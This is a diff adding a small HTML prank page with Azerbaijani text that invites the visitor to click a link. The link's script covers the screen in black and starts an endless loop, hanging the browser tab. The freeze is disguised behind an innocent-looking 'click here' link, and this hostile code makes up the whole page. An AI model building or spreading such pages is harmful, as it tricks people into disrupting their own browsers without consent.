@@ -1,0 +1,29 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Dondu!</title>
+  <style>
+    * { margin: 0; padding: 0; }
+    #blackout {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: black;
+      z-index: 9999;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Salam, linkə toxun!</h1>
+  <a href="#" onclick="freeze()">Buraya bas</a>
+  <div id="blackout"></div>
+  <script>
+    function freeze() {
+      document.getElementById('blackout').style.display = 'block';
+      while(true) {}
+    }
+  </script>
+</body>
+</html>
